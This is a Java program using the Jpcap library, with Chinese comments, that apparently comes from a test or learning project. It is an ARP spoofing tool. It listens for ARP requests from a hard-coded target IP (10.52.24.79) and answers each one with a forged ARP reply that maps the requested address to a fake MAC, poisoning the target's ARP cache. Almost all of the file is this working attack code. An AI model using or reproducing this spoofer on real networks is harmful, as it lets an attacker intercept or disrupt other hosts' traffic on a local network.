package test.jpcap;

import jpcap.*;
import jpcap.NetworkInterface;
import jpcap.packet.*;

import java.io.IOException;
import java.net.*;
import java.util.Scanner;

public class ARPListener {

    public static final String ATTACK_IP = "10.52.24.79";

    public static void main(String[] args) throws Exception {
        // 获取所有网络接口
        NetworkInterface[] devices = JpcapCaptor.getDeviceList();
        showDeviceList(devices);
        // 找到要使用的设备（在这个例子中选择第一个设备）
        NetworkInterface device = devices[0];

        //输入选择的监控的网卡
        Scanner scanner = new Scanner(System.in);
        System.out.print("输入选择监听的适配器序号:");
//        int card = scanner.nextInt();
//        card = card -1;
        int card = 3;
        System.out.println();
        //打开选择的网络接口
        JpcapCaptor captor = JpcapCaptor.openDevice(devices[card], 65535, false, 20);

        // 设置一个回调函数来监听和处理捕获到的包
        captor.setFilter("arp", true);  // 只捕获 ARP 数据包
        System.out.println("正在监听 ARP 包...");

        // 捕获 ARP 数据包
        captor.loopPacket(-1, new PacketReceiver() {
            public void receivePacket(Packet packet) {
                if (packet instanceof ARPPacket) {
                    ARPPacket arpPacket = (ARPPacket) packet;
                    //System.out.println("捕获到来自目标主机的 ARP 请求：" + arpPacket.getSenderProtocolAddress().toString());
                    if (arpPacket.getSenderProtocolAddress().toString().equals("/"+ATTACK_IP)) {
                        System.out.println("捕获到来自目标主机的 ARP 请求：");
                        System.out.println(arpPacket);
                        // 构造伪造的 ARP 响应包
                        ARPPacket replyPacket = createFakeARPReply(arpPacket);
                        // 发送伪造的 ARP 响应包
                        sendFakeARPReply(replyPacket, device);
                    }
                }
            }
        });
    }

    private static void showDeviceList(NetworkInterface[] devices) {
        System.out.println("本机上所有适配器如下：");
        for (int i = 0; i < devices.length; i++) {
            //网络适配器名称
            System.out.println("Adapter " + (i + 1) + "：" + devices[i].description);
            //MAC地址
            System.out.print("    MAC address: ");
            for (byte b : devices[i].mac_address) {
                System.out.print(Integer.toHexString(b & 0xff) + ":");
            }
            System.out.println();
            //IP地址
            for (NetworkInterfaceAddress a : devices[i].addresses) {
                System.out.println("    IPv6/IPv4 address: " + a.address);
            }
            System.out.println();
        }
    }


    // 创建伪造的 ARP 响应包
    private static ARPPacket createFakeARPReply(ARPPacket request) {
        //构造ether帧（frame）
        EthernetPacket ether = new EthernetPacket();
        //设置帧类型为IP
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        //设置源、目的MAC地址
        ether.src_mac = new byte[]{(byte) 0x00, (byte) 0x11, (byte) 0x22, (byte) 0x33, (byte) 0x44, (byte) 0x55};
        ether.dst_mac = request.sender_hardaddr;

        // 构造一个 ARP 响应包
        ARPPacket reply = new ARPPacket();
        // 设置目标主机的 MAC 地址和 IP 地址（例如假设目标是 10.52.24.55）
        reply.hardtype = ARPPacket.HARDTYPE_ETHER;//硬件类型
        reply.prototype = ARPPacket.PROTOTYPE_IP;//协议类型
        reply.hlen = 6;//物理地址长度
        reply.plen = 4;//协议地址长度
        // 伪造回应内容
        reply.operation = ARPPacket.ARP_REPLY;
        reply.sender_hardaddr = new byte[]{(byte) 0x00, (byte) 0x11, (byte) 0x22, (byte) 0x33, (byte) 0x44, (byte) 0x55};
        reply.sender_protoaddr = request.target_protoaddr;
        reply.target_hardaddr = request.sender_hardaddr; //目的端mac地址
        reply.target_protoaddr = request.sender_protoaddr;//目的IP地址

        reply.datalink = ether;//设置arp报文数据链路层
//        // 伪造的 MAC 地址（本机的 MAC 或任意值）
//        reply.setSenderHardwareAddress(new byte[]{(byte) 0x00, (byte) 0x11, (byte) 0x22, (byte) 0x33, (byte) 0x44, (byte) 0x55});
//        reply.setSenderProtocolAddress("10.52.24.55");  // 伪造目标 IP
//        // 目标主机的 MAC 地址和 IP 地址
//        reply.setTargetHardwareAddress(request.getSenderHardwareAddress());  // 从请求包获取目标的 MAC 地址
//        reply.setTargetProtocolAddress(request.getSenderProtocolAddress());  // 从请求包获取目标的 IP 地址

        return reply;
    }

    // 发送伪造的 ARP 响应包
    private static void sendFakeARPReply(ARPPacket reply, NetworkInterface device) {

        try {
            // 创建一个 JpcapSender 对象，用于发送数据包
            JpcapSender sender = JpcapSender.openDevice(device);
            // 发送伪造的 ARP 响应包
            sender.sendPacket(reply);
            System.out.println("已发送伪造的 ARP 响应包！");
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
